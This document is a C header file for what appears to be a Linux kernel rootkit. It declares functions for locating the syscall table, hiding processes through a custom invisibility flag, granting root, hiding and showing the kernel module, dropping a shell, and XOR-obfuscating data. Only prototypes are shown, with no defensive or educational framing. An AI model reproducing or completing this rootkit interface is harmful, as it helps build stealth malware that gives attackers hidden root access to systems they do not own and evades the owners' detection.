#ifndef UTILS_H
#define UTILS_H

#include <linux/types.h>
#include <linux/kernel.h>
#include <linux/sched.h>

#define PF_INVISIBLE 0x10000000
#define XOR_KEY 0xAA

unsigned long *get_syscall_table(void);
struct task_struct *find_task(pid_t pid);
int is_invisible(pid_t pid);
void give_root(void);
void module_hide(void);
void module_show(void);
void drop_shell(void);
int encrypt_decrypt(char *data, size_t len);

#endif /* UTILS_H */
